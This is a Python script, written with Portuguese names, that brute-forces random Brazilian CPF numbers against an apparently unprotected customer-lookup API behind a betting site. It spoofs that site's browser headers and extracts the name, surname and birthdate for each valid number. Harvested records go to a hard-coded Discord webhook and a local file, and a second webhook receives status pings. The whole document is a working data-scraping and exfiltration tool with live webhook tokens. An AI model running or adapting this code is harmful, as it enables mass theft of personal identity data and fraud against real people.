import requests, time, random

arquivo = open("usados.txt", "a")
arquivo2 = open("usados.txt", "r")
arquivo3 = open("cpfpegos.txt", "a")
contar = 0
dedes = ""

def pegarcpf(dados):
  try:
    dadoss = requests.get(
      f"https://odin.sportingtech.com/api/generic/register/getCustomerByCpfNumber?cpfNumber={dados}",
      headers={
        "Origin":
        "https://m.esportesdasorte.com",
        "Referer":
        "https://m.esportesdasorte.com",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.117"
      })
    previa = ""
    try:
      previa = dadoss.json()
    except Exception:
      pass

    if "firstName" in str(previa):
      json = previa
      requests.post(
        "https://discord.com/api/webhooks/1028748079551238184/oHNHSQr2jgd4NPfVTI3b2hHl2OLYKBXbYceFuxCspCMW0w6J_rv8vUT6WIMqaQRA_aK8",
        data={
          "content":
          f"```CPF:{dados}\nNome:{json['data']['firstName']} Sobrenome:{json['data']['secondName']} \nData de nascimento:{json['data']['birthdate']}```"
        })
      arquivo3.write(f"\n|  {dados}  {dadoss.json()} {dadoss.status_code}  |")
      return dadoss.status_code
    else:
      print(f"CPF inválido {dadoss.status_code}")
      return dadoss.status_code
  except Exception:
    return 500


while True:
  dede = arquivo2.read()
  listacpf = []
  while len(dedes) != 8:
    dedes += str(random.randint(0, 9))
  doisultimos = f"{random.randint(0,9)}{random.randint(0,9)}"
  for e in range(0, 10):
    listacpf.append(f"{dedes}{e}{doisultimos}")
  dedes = ""
  for dados in listacpf:
    if dados not in dede:
      time.sleep(1)
      arquivo.write(f" {dados}")
      print(dados)
      while True:
        retorno = pegarcpf(dados)
        if retorno == 400 or retorno == 200:
          break
        else:
          print(retorno)
          print("Deu erro")
          time.sleep(2)
      contar += 1
      if contar == 10:
        contar = 0
        try:
          requests.post("https://discord.com/api/webhooks/1028761650104369203/d899GWM1oFwNLDywTiRs7wzWAd_JQuKs81a976wf2zfMf4tnSbt7rNlcLdPC-EjAG-HF",data={"content": f"Tou on"})
        except Exception:
          contar = 10
  
